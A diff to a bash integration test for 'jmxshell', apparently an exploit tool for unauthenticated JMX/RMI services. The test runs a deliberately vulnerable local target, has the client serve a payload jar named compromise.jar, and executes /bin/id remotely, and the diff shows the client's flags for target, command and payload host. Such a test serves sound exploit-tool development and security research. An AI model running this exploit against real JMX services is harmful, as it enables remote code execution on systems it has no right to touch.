@@ -2,8 +2,9 @@
 #
 # End-to-end test for jmxshell. Stands up the standalone vulnerable
 # target (build/target/jmx-target.jar) on 127.0.0.1:1099 (no auth, no SSL),
-# serves compromise.jar over HTTP, runs the matching jmxshell client, and
-# asserts the `/bin/id` invocation came back with a uid= line.
+# runs the matching jmxshell client (which serves compromise.jar over its
+# own built-in HTTP server), and asserts the `/bin/id` invocation came
+# back with a uid= line.
 #
 # Usage:
 #   scripts/integration-test.sh                # target JDK 8 by default
@@ -12,7 +13,7 @@
 #
 # Env vars:
 #   SKIP_BUILD=1   Skip the gradle build step (caller has already built)
-#   HTTP_PORT      HTTP port for serving compromise.jar (default 8000)
+#   HTTP_PORT      HTTP port for serving compromise.jar (default 12345)
 #   JMX_PORT       JMX/RMI port the target listens on (default 1099)
 #   ID_CMD         Path to id binary (defaults /bin/id, falls back to /usr/bin/id)
 #   EXPECT_FAIL=1  Negative test: assert the exploit fails (exit non-zero)
@@ -21,7 +22,6 @@
 #                  e.g. for JDK 25 targets where MLet has been removed)
 #
 # Requirements:
-#   - python3 in PATH (HTTP server for compromise.jar / woot.html)
 #   - A JDK reachable via JAVA_HOME or `java` on PATH
 
 set -euo pipefail
@@ -40,15 +40,13 @@ fi
 
 ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
 WORK="$(mktemp -d -t jmxshell-it.XXXXXX)"
-HTTP_PORT="${HTTP_PORT:-8000}"
+HTTP_PORT="${HTTP_PORT:-12345}"
 JMX_PORT="${JMX_PORT:-1099}"
 TARGET_PID=""
-HTTP_PID=""
 
 cleanup() {
     set +e
     [ -n "$TARGET_PID" ] && kill "$TARGET_PID" 2>/dev/null
-    [ -n "$HTTP_PID" ] && kill "$HTTP_PID" 2>/dev/null
     rm -rf "$WORK"
 }
 trap cleanup EXIT
@@ -85,9 +83,7 @@ echo "==> Starting jmx-target.jar on 127.0.0.1:${JMX_PORT}"
     >"$WORK/target.log" 2>&1 &
 TARGET_PID=$!
 
-echo "==> Serving build/web on http://127.0.0.1:${HTTP_PORT}"
-( cd build/web && python3 -m http.server "${HTTP_PORT}" ) >"$WORK/http.log" 2>&1 &
-HTTP_PID=$!
+echo "==> jmxshell will run its built-in HTTP server on 127.0.0.1:${HTTP_PORT}"
 
 echo "==> Waiting for JMX port ${JMX_PORT}"
 for i in $(seq 1 60); do
@@ -115,9 +111,9 @@ echo "==> Sending command: $ID_CMD"
 
 set +e
 OUT="$("$JAVA" -jar "$CLIENT_JAR" \
-    --host 127.0.0.1 --port "${JMX_PORT}" \
+    --target 127.0.0.1 --jmxPort "${JMX_PORT}" \
     --command "$ID_CMD" \
-    --url "http://127.0.0.1:${HTTP_PORT}" 2>&1)"
+    --lhost 127.0.0.1 --lport "${HTTP_PORT}" 2>&1)"
 RC=$?
 set -e
 
